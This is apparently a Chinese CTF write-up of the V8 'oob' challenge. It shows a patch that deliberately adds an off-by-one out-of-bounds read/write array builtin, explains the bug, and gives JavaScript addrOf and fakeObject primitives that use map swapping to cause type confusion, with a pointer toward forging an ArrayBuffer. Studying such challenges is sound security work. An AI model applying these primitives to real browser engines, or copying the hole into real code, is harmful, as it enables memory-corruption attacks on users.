补丁：

```
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);  //增加了一个oob成员函数
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",


diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    /* 参数多于2即退出 */
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);                       
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());         //取数组对象的elements出来
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());            //数组长度
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));      //读下标length的元素出来
+                                                                                   //即越界读一个元素大小
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());                                      //往下标length处写入value
+                                                                                   //即越界写一个元素大小
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
```

### Root case

主要原因就是在读取和写入中，将length当作了数组下标（正确应为length - 1），所以导致存在了一个off-by-one。

这里有一个小trick：

如果使用[]方括号来声明数组，得到的内存布局中对象的elements会在对象的前面。但是如果用的是new Array()的方法来声明数组，得到的内存布局中，elements会放在对象的后面。

我们可以利用off-by-one来修改object的map，如果修改了一个object的map，那么在识别他类型的时候就会识别为map所对应的类型，这样就导致了类型混淆。

##### 首先构造原语：
oob很好理解，如果有一个参数就是将参数越界write，如果没有参数则是越界读（因为默认有一个参数this，所以代码里参数数量分别为1和2）

```
var obj = {m:i2f(0xdeadbeef), target:func};
var objarray = [obj];
var floatarray = [1.1,2.2,3.3];
var floatmap = floatarray.oob();
var objmap = objarray.oob();

function addrOf(target)
    {
        objarray[0] = target;          
        objarray.oob(floatmap);    
        let ret = objarray[0];          
        objarray.oob(objmap);  
        return f2i(ret);
    }
    
    //fake a float as an object pointer
    function fakeObject(target)
    {
        floatarray[0] = target;         
        floatarray.oob(objmap);    
        let ret = floatarray[0];
        floatarray.oob(floatmap);  
        return ret;
    }
```

简单解释一下：

- 首先是addrof，我们首先在objarray的elements[0]处布置一个目标object，之后将objarray的map修改为floatmap，这样v8就会识别他为float数组，我们就可以将object以float的形式读出，也就获得了他的地址。
- 接着是fakeObject，当我们需要将一个float被识别为object时，就会用到该原语，首先将floatarray的elements[0]处布置一个要伪造的float，之后将floatarray的map修改为objmap，这样的话v8就会将floatarray中的值当作一个object。

之后直接伪造一个arraybuffer即可，利用写起来类似于这个之前的cve：https://github.com/yytgravity/Daily-learning-record/tree/master/cve/CVE-2017-5070


